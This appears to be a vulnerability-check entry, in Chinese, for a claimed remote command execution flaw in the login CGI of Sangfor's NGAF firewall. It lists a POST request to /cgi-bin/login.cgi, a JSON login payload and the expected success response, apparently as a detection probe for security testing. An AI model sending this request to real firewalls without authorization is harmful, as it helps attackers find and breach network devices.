# 深信服下一代防火墙NGAFlogin远程命令执行漏洞

深信服 ｜ 命令执行 ｜ —
- **请求**：`POST /cgi-bin/login.cgi HTTP/1.1`

**Payload**
```
{"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy\_enable": "0"}}
```
- **响应特征**：200 success